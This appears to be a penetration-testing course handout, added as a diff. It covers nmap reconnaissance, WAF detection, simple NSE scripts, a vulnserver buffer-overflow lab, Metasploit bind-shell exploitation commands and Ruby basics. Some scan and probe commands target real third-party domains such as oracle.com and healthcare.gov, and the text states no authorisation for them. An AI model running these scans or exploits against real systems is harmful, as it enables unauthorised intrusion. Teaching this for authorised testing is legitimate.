@@ -1,0 +1,5309 @@
+##############################
+# Basic Scanning Methodology #
+# Transition from Blue to    #
+# Red Team Tactics           #
+##############################
+
+- Ping Sweep
+What's alive?
+---------------------------Type This-----------------------------------
+sudo nmap -sP 157.166.226.*
+     strategicsec
+-------------------------------------------------------------------------
+
+
+	-if -SP yields no results try:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.*
+     strategicsec
+-------------------------------------------------------------------------
+
+
+	-Look for hostnames:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.* | grep com
+     strategicsec
+-------------------------------------------------------------------------
+
+
+- Port Scan
+What's where?
+---------------------------Type This-----------------------------------
+sudo nmap -sS 162.243.126.247
+     strategicsec
+-------------------------------------------------------------------------
+
+
+
+- Bannergrab/Version Query
+What versions of software are running
+---------------------------Type This-----------------------------------
+sudo nmap -sV 162.243.126.247
+     strategicsec
+-------------------------------------------------------------------------
+
+
+
+- Vulnerability Research
+Lookup the banner versions for public exploits
+----------------------------------------------
+http://exploit-db.com
+http://securityfocus.com/bid
+https://packetstormsecurity.com/files/tags/exploit/
+
+
+-------------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+cd ~/toolz
+ 
+wget --no-check-certificate https://raw.githubusercontent.com/BenDrysdale/ipcrawl/master/ipcrawl.c
+ 
+gcc ipcrawl.c -o ipcrawl
+ 
+chmod 777 ipcrawl
+ 
+./ipcrawl 148.87.1.1 148.87.1.254               (DNS forward lookup against an IP range)
+ 
+ 
+sudo nmap -sL 148.87.1.0-255
+     strategicsec
+sudo nmap -sL 148.87.1.0-255 | grep oracle
+     strategicsec
+ 
+ 
+ 
+wget --no-check-certificate https://dl.packetstormsecurity.net/UNIX/scanners/propecia.c
+ 
+gcc propecia.c -o propecia
+ 
+sudo cp propecia /bin
+     strategicsec
+ 
+propecia 162.243.126 22
+
+propecia 162.243.126 80
+
+propecia 162.243.126 443
+
+propecia 162.243.126 3389
+-------------------------------------------------------------------------
+
+
+
+
+ 
+ 
+ 
+###########################
+# Target IP Determination #
+###########################
+---------------------------Type This-----------------------------------
+cd /home/strategicsec/toolz 
+
+perl blindcrawl.pl -d motorola.com
+----------------------------------------------------------------------
+ 
+-- Take each IP address and look ip up here:
+http://www.networksolutions.com/whois/index.jsp
+ 
+ 
+Zone Transfer fails on most domains, but here is an example of one that works:
+---------------------------Type This-----------------------------------
+dig axfr heartinternet.co.uk  @ns.heartinternet.co.uk
+ 
+ 
+cd ~/toolz/
+./ipcrawl 148.87.1.1 148.87.1.254               (DNS forward lookup against an IP range)
+ 
+ 
+sudo nmap -sL 148.87.1.0-255
+     strategicsec
+
+
+sudo nmap -sL 148.87.1.0-255 | grep oracle
+     strategicsec
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+###########################
+# Load Balancer Detection #
+###########################
+ 
+Here are some options to use for identifying load balancers:
+    - http://toolbar.netcraft.com/site_report
+    - https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/
+ 
+ 
+Here are some command-line options to use for identifying load balancers:
+---------------------------Type This----------------------------------- 
+dig microsoft.com
+ 
+cd ~/toolz
+./lbd-0.1.sh microsoft.com
+ 
+ 
+halberd microsoft.com
+halberd motorola.com
+halberd oracle.com
+---------------------------------------------------------------------- 
+ 
+ 
+######################################
+# Web Application Firewall Detection #
+######################################
+---------------------------Type This----------------------------------- 
+cd ~/toolz/wafw00f
+python wafw00f.py http://www.oracle.com
+python wafw00f.py http://www.strategicsec.com
+ 
+ 
+cd ~/toolz/
+sudo nmap -p 80 --script http-waf-detect.nse oracle.com
+     strategicsec
+ 
+sudo nmap -p 80 --script http-waf-detect.nse healthcare.gov
+     strategicsec
+----------------------------------------------------------------------
+
+#####################################
+# Writing Your Own Nmap NSE Scripts #
+#####################################
+---------------------------Type This-----------------------------------
+sudo rm -rf /usr/share/nmap/scripts/intro-nse.nse 
+
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+-----------------------------------------------------------------------
+
+---------------------------Paste This----------------------------------
+-- The Head Section --
+-- The Rule Section --
+portrule = function(host, port)
+    return port.protocol == "tcp"
+            and port.number == 80
+            and port.state == "open"
+end
+ 
+-- The Action Section --
+action = function(host, port)
+    return "RedTeam!"
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse infosecaddicts.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+---------------------------Paste This----------------------------------
+-- The Head Section --
+local shortport = require "shortport"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+ 
+-- The Action Section --
+action = function(host, port)
+    return "RedTeam!"
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse infosecaddicts.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+ 
+ 
+OK, now let's have some fun with my buddy Carlos Perez's website which you should have been looking at quite a lot if you were trying to get Ruby 2.1.5 working last year.
+ 
+
+---------------------------Type This-----------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+
+---------------------------Paste This---------------------------------- 
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+    return response.status
+ 
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+----------------------------------------------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+---------------------------Paste This---------------------------------- 
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+ 
+    if ( response.status == 200 ) then
+        return response.body
+    end
+ 
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+ 
+ 
+
+---------------------------Type This-----------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+
+---------------------------Paste This----------------------------------
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+local string = require "string"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+ 
+    if ( response.status == 200 ) then
+        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
+        return title
+    end
+ 
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+ 
+ 
+
+---------------------------Type This-----------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+---------------------------Paste This---------------------------------- 
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+local string = require "string"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+ 
+    if ( response.status == 200 ) then
+        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
+ 
+        if (title) then
+            return "Vulnerable"
+        else
+            return "Not Vulnerable"
+        end
+    end
+end
+ 
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
+----------------------------------------------------------------------
+
+
+
+#####################################
+# Quick Stack Based Buffer Overflow #
+#####################################
+ 
+- You can download everything you need for this exercise (except netcat) from the link below
+https://s3.amazonaws.com/infosecaddictsfiles/ExploitLab.zip
+ 
+- Extract this zip file to your Desktop
+ 
+- Go to folder C:\Users\Workshop\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
+ 
+- Open a new command prompt and type:
+nc localhost 9999
+ 
+- In the new command prompt window where you ran nc type:
+HELP
+ 
+- Go to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts
+- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
+ 
+- Now double-click on 1-simplefuzzer.py
+- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
+ 
+ 
+- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
+ 
+- Now go to folder C:\Users\Workshop\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
+ 
+- Go back to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
+ 
+- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
+ 
+- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
+ 
+- Calculate the distance to EIP by running script 3-3000chars.py
+- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
+ 
+4-count-chars-to-EIP.py
+- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
+- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
+ 
+5-2006char-eip-check.py
+- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
+ 
+6-jmp-esp.py
+- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
+ 
+7-first-exploit
+- In this script we actually do the stack overflow and launch a bind shell on port 4444
+ 
+8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
+ 
+ 
+------------------------------
+ 
+cd /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
+ 
+vi vulnserv.rb    (paste the code into this file)
+ 
+ 
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+ 
+ 
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST 192.168.88.129
+set RPORT 9999
+exploit
+
+
+
+
+
+
+
+Code to analyze:
+https://downloads.securityfocus.com/vulnerabilities/exploits/07.30.dcom48.c
+
+
+
+
+
+
+Metasploit Next Level
+ 
+ 
+##########################
+# Download the attack VM #
+##########################
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user: infosecaddicts
+pass: infosecaddicts
+ 
+ 
+ 
+ 
+ 
+###########################
+# Download the victim VMs #
+###########################
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
+user: workshop
+pass: password
+ 
+ 
+###########################
+# Exploit Development VMs #
+###########################
+Note: this link will work tomorrow
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/XPSP3-ED-Target.zip
+ 
+user: administrator
+pass: strategicsec
+ 
+ 
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Strategicsec-XP-ED-Attack-Host.zip
+user: strategicsec
+pass: strategicsec
+ 
+ 
+ 
+ 
+ 
+############################################################
+# Section 1: Ruby Fundamentals and Metasploit Architecture #
+############################################################
+ 
+############################
+# Day 1: Ruby Fundamentals #
+############################
+ 
+ 
+ 
+- Ruby is a general-purpose, object-oriented programming language, which was created by Yukihiro Matsumoto, a computer
+scientist and programmer from Japan. It is a cross-platform dynamic language.
+ 
+- The major implementations of this language are Ruby MRI, JRuby, HotRuby, IronRuby, MacRuby, etc. Ruby
+on Rails is a framework that is written in Ruby.
+ 
+- Ruby's file name extensions are .rb and .rbw.
+ 
+- official website of this
+ 
+- language: www.ruby-lang.org.
+ 
+ 
+- interactive Shell called Ruby Shell
+ 
+ 
+- Installing and Running IRB
+ 
+---------------------------Type This-----------------------------------
+ruby -v
+-----------------------------------------------------------------------
+ 
+ 
+If you don't have ruby2.3 use the commands below:
+-----------------------------------------------------------------------
+sudo apt-get install ruby2.3 ruby2.3-dev ruby2.3-doc irb rdoc ri
+-----------------------------------------------------------------------
+ 
+- open up the interactive console and play around.
+ 
+---------------------------Type This-----------------------------------
+irb
+-----------------------------------------------------------------------
+ 
+ 
+- Math, Variables, Classes, Creating Objects and Inheritance
+ 
+ 
+The following arithmetic operators:
+    Addition operator (+) — 10 + 23
+    Subtraction operator (-) — 1001 - 34
+    Multiplication operator (*) — 5 * 5
+    Division operator (/) — 12 / 2
+ 
+ 
+ 
+- Now let's cover some variable techniques. In Ruby, you can assign a value to a variable using the assignment
+operator. '=' is the assignment operator. In the following example, 25 is assigned to x. Then x is incremented by
+30. Again, 69 is assigned to y, and then y is incremented by 33.
+ 
+---------------------------Type This-----------------------------------
+x = 25
+x + 30
+y = 69
+y+33
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Let's look at creating classes and creating objects.
+ 
+- Here, the name of the class is Strategicsec. An object has its properties and methods.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Attack
+attr_accessor :of, :sqli, :xss
+end
+-----------------------------------------------------------------------
+ 
+ 
+What is nil?
+Reference:
+https://www.codecademy.com/en/forum_questions/52a112378c1cccb0f6001638
+ 
+nil is the Ruby object that represents nothingness. Whenever a method doesn’t return a useful value, it returns nil. puts and print are methods that return nil:
+ 
+Since the Ruby Console always shows the value of the last statement or expression in your code, if that last statement is print, you’ll see the nil.
+ 
+To prevent the nil from "sticking" to the output of print (which doesn’t insert a line break), you can print a line break after it, and optionally put some other value as the last statement of your code, then the Console will show it instead of nil:
+ 
+ 
+ 
+ 
+ 
+# Now that we have created the classes let's create the objects
+---------------------------Type This-----------------------------------
+first_attack = Attack.new
+first_attack.of = "stack"
+first_attack.sqli = "blind"
+first_attack.xss = "dom"
+puts first_attack.of
+puts first_attack.sqli
+puts first_attack.xss
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Let's work on some inheritance that will help make your programming life easier. When we have multiple classes,
+inheritance becomes useful. In simple words, inheritance is the classification of classes. It is a process by which
+one object can access the properties/attributes of another object of a different class. Inheritance makes your
+programming life easier by maximizing code reuse.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Exploitframeworks
+attr_accessor :scanners, :exploits, :shellcode, :postmodules
+end
+class Metasploit < Exploitframeworks
+end
+class Canvas < Exploitframeworks
+end
+class Coreimpact < Exploitframeworks
+end
+class Saint < Exploitframeworks
+end
+class Exploitpack < Exploitframeworks
+end
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Methods, More Objects, Arguments, String Functions and Expression Shortcuts
+ 
+- Let's create a simple method. A method is used to perform an action and is generally called with an object.
+ 
+- Here, the name of the method is 'learning'. This method is defined inside the Msfnl class. When it is called,
+it will print this string: "We are Learning how to PenTest"
+ 
+- An object named 'bo' is created, which is used to call the method.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Msfnl
+def learning
+puts "We are Learning how to PenTest"
+end
+end
+-----------------------------------------------------------------------
+ 
+#Now let's define an object for our Method
+ 
+---------------------------Type This-----------------------------------
+joe = Msfnl.new
+joe.learning
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- An argument is a value or variable that is passed to the function while calling it. In the following example, while
+calling the puts() function, we are sending a string value to the function. This string value is used by the
+function to perform some particular operations.
+ 
+puts ("Pentesting")
+ 
+ 
+- There are many useful string functions in Ruby. String functions make it easy to work with strings. Now, we will
+explain some useful string functions with an example.
+ 
+- The length function calculates the length of a string. The upcase function converts a string to uppercase. And the
+reverse function reverses a string. The following example demonstrates how to use the string functions.
+ 
+---------------------------Type This-----------------------------------
+55.class
+"I Love Programming".class
+"I Love Pentesting".length
+"Pown that box".upcase
+"Love" + "To Root Boxes"
+"evil".reverse
+"evil".reverse.upcase
+-----------------------------------------------------------------------
+ 
+ 
+-  expressions and shortcuts. In the below example, 'a' is an operand, '3' is an operand,  '=' is
+an operator, and 'a=3' is the expression. A statement consists of one or multiple expressions. Following are the
+examples of some expressions.
+ 
+---------------------------Type This-----------------------------------
+a = 3
+b = 6
+a+b+20
+d = 44
+f = d
+puts f
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+- shortcuts. +=, *= are the shortcuts. These operators are also called abbreviated
+assignment operators. Use the shortcuts to get the effect of two statements in just one. Consider the following
+statements to understand the shortcuts.
+ 
+---------------------------Type This-----------------------------------
+g = 70
+g = g+44
+g += 33
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is incremented by 33 and then the total value is assigned to g.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+g *= 3
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is multiplied with 3 and then assigned to g.
+ 
+- Example
+ 
+- Comparison Operators, Loops, Data Types, and Constants
+ 
+- Comparison operators are used for comparing one variable or constant with another variable or constant. We will show
+how to use the following comparison operators.
+ 
+'Less than' operator (<): This operator is used to check whether a variable or constant is less than another
+variable or constant. If it's less than the other, the 'less than' operator returns true.
+ 
+'Equal to' operator (==): This operator is used to check whether a variable or constant is equal to another variable
+or constant. If it's equal to the other, the 'equal to' operator returns true.
+ 
+'Not equal to' operator (!=): This operator is used to check whether a variable or constant is not equal to another
+variable or constant. If it's not equal to the other, the 'not equal to' operator returns true.
+ 
+---------------------------Type This-----------------------------------
+numberofports = 55
+puts "number of ports found during scan" if numberofports < 300
+numberofports = 400
+puts "number of ports found during scan" if numberofports < 300
+puts "number of ports found during scan" if numberofports == 300
+puts "number of ports found during scan" if numberofports != 300
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Example
+ 
+ 
+- the 'OR' operator and the 'unless' keyword. This symbol '||' represents the logical 'OR' operator.
+ 
+- This operator is generally used to combine multiple conditions.
+- In case of two conditions, if both or any of the conditions is true, the 'OR'operator returns true. Consider the
+ 
+- following example to understand how this operator works.
+ 
+---------------------------Type This-----------------------------------
+ports = 100
+puts "number of ports found on the network" if ports<100 || ports>200
+puts "number of ports found on the network" if ports<100 || ports>75
+-----------------------------------------------------------------------
+ 
+# unless
+ 
+---------------------------Type This-----------------------------------
+portsbelow1024 = 50
+puts "If the ports are below 1024" unless portsbelow1024 < 1000
+puts "If the ports are below 1024" unless portsbelow1024 < 1055
+puts "If the ports are below 1024" unless portsbelow1024 < 20
+-----------------------------------------------------------------------
+ 
+- The 'unless' keyword is used to do something programmatically unless a condition is true.
+ 
+ 
+ 
+- Loops are used to execute statement(s) repeatedly. Suppose you want to print a string 10 times.
+ 
+- See the following example to understand how a string is printed 10 times on the screen using a loop.
+ 
+---------------------------Type This-----------------------------------
+10.times do puts "infosecaddicts" end
+-----------------------------------------------------------------------
+ 
+# Or use the curly braces
+ 
+---------------------------Type This-----------------------------------
+10.times {puts "infosecaddicts"}
+-----------------------------------------------------------------------
+ 
+ 
+- Changing Data Types: Data type conversion is an important concept in Ruby because it gives you flexibility while
+working with different data types. Data type conversion is also known as type casting.
+ 
+ 
+ 
+- Constants: Unlike variables, the values of constants remain fixed during the program interpretation. So if you
+change the value of a constant, you will see a warning message.
+ 
+ 
+ 
+ 
+- Multiple Line String Variable, Interpolation, and Regular Expressions
+ 
+- A multiple line string variable lets you assign the value to the string variable through multiple lines.
+ 
+---------------------------Type This-----------------------------------
+infosecaddicts = <<mark
+welcome
+to the
+best
+metasploit
+course
+on the
+market
+mark
+puts infosecaddicts
+-----------------------------------------------------------------------
+ 
+ 
+- Interpolation lets you evaluate any placeholder within a string, and the placeholder is replaced with the value that
+it represents. So whatever you write inside #{ } will be evaluated and the value will be replaced at that position.
+Examine the following example to understand how interpolation works in Ruby.
+ 
+References:
+https://stackoverflow.com/questions/10869264/meaning-of-in-ruby
+ 
+ 
+---------------------------Type This-----------------------------------
+a = 4
+b = 6
+puts "a * b = a*b"
+puts " #{a} * #{b} = #{a*b} "
+person = "Joe McCray"
+puts "IT Security consultant person"
+puts "IT Security consultant #{person}"
+-----------------------------------------------------------------------
+ 
+- Notice that the placeholders inside #{ } are evaluated and they are replaced with their values.
+ 
+ 
+ 
+ 
+ 
+- Character classes
+---------------------------Type This-----------------------------------
+infosecaddicts = "I Scanned 45 hosts and found 500 vulnerabilities"
+"I love metasploit and what it has to offer!".scan(/[lma]/) {|y| puts y}
+"I love metasploit and what it has to offer!".scan(/[a-m]/) {|y| puts y}
+-----------------------------------------------------------------------
+ 
+ 
+- Arrays, Push and Pop, and Hashes
+ 
+ 
+- In the following example, numbers is an array that holds 6 integer numbers.
+ 
+ 
+---------------------------Type This-----------------------------------
+numbers = [2,4,6,8,10,100]
+puts numbers[0]
+puts numbers[4]
+numbers[2] = 150
+puts numbers
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now we will show how you can implement a stack using an array in Ruby. A stack has two operations - push and pop.
+ 
+ 
+---------------------------Type This-----------------------------------
+framework = []
+framework << "modules"
+framework << "exploits"
+framework << "payloads"
+framework.pop
+framework.shift
+-----------------------------------------------------------------------
+ 
+- Hash is a collection of elements, which is like the associative array in other languages. Each element has a key
+that is used to access the element.
+ 
+ 
+- Hash is a Ruby object that has its built-in methods. The methods make it easy to work with hashes.
+In this example, 'metasploit' is a hash. 'exploits', 'microsoft', 'Linux' are the keys, and the following are the
+respective values: 'what module should you use', 'Windows XP' and 'SSH'.
+ 
+---------------------------Type This-----------------------------------
+metasploit = {'exploits' => 'what module should you use', 'microsoft' => 'Windows XP', 'Linux' => 'SSH'}
+print metasploit.size
+print metasploit["microsoft"]
+metasploit['microsoft'] = 'redhat'
+print metasploit['microsoft']
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Writing Ruby Scripts
+ 
+ 
+- Let's take a look at one of the ruby modules and see exactly now what it is doing. Now explain to me exactly what
+this program is doing. If we take a look at the ruby program what you find is that it is a TCP port scanner that
+someone made to look for a specific port. The port that it is looking for is port 21 FTP.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------
+ 
+ack.rb  ftpbounce.rb  syn.rb  tcp.rb  xmas.rb
+ 
+- Lets look at tcp.rb
+   
+ 
+ 
+- Let's take the time now to create and design our own port scanner what we will design here is a port scanner that
+will scan for port up to 0-1024. And we will add a function in there for the port scanner to prompt us stating OPEN
+port if it detects it. This is a pretty basic script, but it will help you in the event that you need to write
+something on the fly.
+ 
+ 
+-----------------------------------------------------------------------
+- PortScanner.rb :
+ 
+require 'socket'
+require 'timeout'
+ 
+puts "Enter IP Address to Scan:"
+ipaddress = gets
+ 
+1.upto(1024) {|port|
+  begin
+    timeout(5) do
+      TCPSocket.open(ipaddress.chop, port)
+    end
+    puts "Response/Port Open: #{port}"
+  rescue Timeout::Error
+    # uncomment the following line to show closed ports (noisy!)
+    #puts "No Response /Port closed: #{port}"
+  rescue
+    # uncomment the following line to show closed ports (noisy!)
+    #puts "No Response /Port closed: #{port}"
+  end
+}
+ 
+---------------------------------------------------------------------------------
+ 
+Day 1 Homework:
+Send Ivana an email ivana{a-t}strategicsec{d-o-t}.com with a word document that contains screenshots of everything that we have covered so far. Make the subject of the email "First Name - Last Name - Metasploit Day 1" (ex: Joseph - McCray - Metasploit Day 1).
+ 
+Also be sure to name the attached file "FirstName.LastName.MetasploitDay1.docx" (Joseph.McCray.MetasploitDay1.docx).
+ 
+NOTE: This is what is required in order to receive your certificate of completion and CPEs.
+---------------------------------------------------------------------------------
+ 
+ 
+ 
+##################################
+# Day 2: Metasploit Fundamentals #
+##################################
+ 
+- Let's take a little look at Metasploit Framework
+ 
+- First, we should take note of the different directories, the Modular Architecture.
+ 
+The modules that make up the Modular Architecture are
+Exploits
+Auxiliary
+Payload
+Encoder
+Nops
+ 
+ 
+Important directories to keep in mind for Metasploit, in case we'd like to edit different modules, or add our own,
+ 
+are
+ 
+Modules
+Scripts
+Plugins
+External
+Data
+Tools
+ 
+- Let's take a look inside the Metasploit directory and see what's the
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit
+ls
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now let's take a look inside the Modules directory and see what's there.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules
+ls
+-----------------------------------------------------------------------
+ 
+       
+The auxiliary directory is where the things like our port-scanners will be, or any module that we can run that does
+not necessarily need to - have a shell or session started on a machine.
+ 
+The exploits directory has our modules that we need to pop a shell on a box.
+The external directory is where we can see all of the modules that use external libraries from tools Metasploit uses
+like Burp Suite
+- Let's take a look at the external directory
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/external
+ls
+-----------------------------------------------------------------------
+ 
+- Our data directory holds helper modules for Metasploit to use with exploits or auxiliary modules.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/data
+ls
+-----------------------------------------------------------------------
+ 
+- For example, the wordlist directory holds files that have wordlists in them for brute-forcing logins or doing DNS
+brute-forcing
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/data/wordlists
+ls
+-----------------------------------------------------------------------
+ 
+- The Meterpreter directory inside of the data directory houses the DLLs used for the functionality of Meterpreter
+once a session is created.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/data/meterpreter
+ls
+-----------------------------------------------------------------------
+ 
+- The scripts inside the scripts/Meterpreter directory are scripts that Meterpreter uses for post-exploitation, things
+like escalating privileges and dumping hashes.
+ 
+These are being phased out, though, and post-exploitation modules are what is being more preferred.
+The next important directory that we should get used to is the 'tools' directory. Inside the tools directory we'll
+find a bunch of different ruby scripts that help us on a pentest with things ranging from creating a pattern of code
+for creating exploits, to a pattern offset script to find where at in machine language that we need to put in our
+custom shellcode.
+ 
+The final directory that we'll need to keep in mind is the plugins directory, which houses all the modules that have
+to do with other programs to make things like importing and exporting reports simple.
+Now that we have a clear understanding of what all of the different directories house, we can take a closer look at
+the exploits directory and get a better understanding of how the directory structure is there, so if we make our own
+modules we're going to have a better understanding of where everything needs to go.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/exploits
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- The exploits directory is split up into several different directories, each one housing exploits for different types
+of systems. I.E. Windows, Unix, OSX, dialup and so on.
+Likewise, if we were to go into the 'windows' directory, we're going to see that the exploits have been broken down
+into categories of different types of services/programs, so that you can pick out an exploit specifically for the
+service you're trying to exploit. Let's dig a little deeper into the auxiliary directory and see what all it holds
+for us.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/
+ls
+-----------------------------------------------------------------------      
+ 
+ 
+- And a little further into the directory, let's take a look at what's in the scanner directory
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- And one more folder deeper into the structure, let's take a look in the portscan folder
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------    
+ 
+- If we run 'cat tcp.rb' we'll find that this module is simply a TCP scanner that will find tcp ports that are open
+and report them back to us in a nice, easily readable format.
+ 
+cat tcp.rb
+   
+ 
+ 
+- Just keep in mind that all of the modules in the auxiliary directory are there for information gathering and for use
+once you have a session on a machine.
+Taking a look at the payload directory, we can see all the available payloads, which are what run after an exploit
+succeeds.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/payloads/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+- There are three different types of payloads: single, stagers, and staged. Each type of payload has a different
+application for it to be used as.
+Single payloads do everything you need them to do at one single time, so they call a shell back to you and let you
+do everything once you have that shell calling back to you.
+Stagers are required for limited payload space so that the victim machine will call back to your attack box to get
+the rest of the instructions on what it's supposed to do. The first stage of the payload doesn't require all that
+much space to just call back to the attacking machine to have the rest of the payload sent to it, mainly being used
+to download Stages payloads.
+ 
+ 
+- Stages are downloaded by stagers and typically do complex tasks, like VNC sessions, Meterpreter sessions, or bind
+shells.
+---------------------------Type This-----------------------------------
+cd singles
+cd windows
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- We can see several different payloads here that we can use on a windows system. Let's take a look at adduser.rb and
+see what it actually does.
+---------------------------Type This-----------------------------------
+cat adduser.rb
+-----------------------------------------------------------------------
+ 
+Which when looking at the code, we can see that it will add a new user called "Metasploit" to the machine and give
+the new user "Metasploit" a password of "Metasploit$1" Further down in the file we can actually see the command that
+it gives Windows to add the user to the system.
+ 
+ 
+- Stagers just connect to victim machine back to yours to download the Stages payload, usually with a
+ 
+windows/shell/bind_tcp or windows/shell/reverse_tcp
+---------------------------Type This-----------------------------------
+cd ../../stagers
+ls
+-----------------------------------------------------------------------
+   
+ 
+ 
+- Again, we can see that we have stagers for multiple systems and code types.
+---------------------------Type This-----------------------------------
+ls windows/
+-----------------------------------------------------------------------    
+ 
+ 
+As you can see, the stagers are mainly just to connect to the victim, to setup a bridge between us and the victim
+machine, so we can upload or download our stage payloads and execute commands.
+Lastly, we can go to our stages directory to see what all payloads are available for us to send over for use with
+our stagers...
+---------------------------Type This-----------------------------------
+cd ../stages
+ls
+-----------------------------------------------------------------------    
+ 
+ 
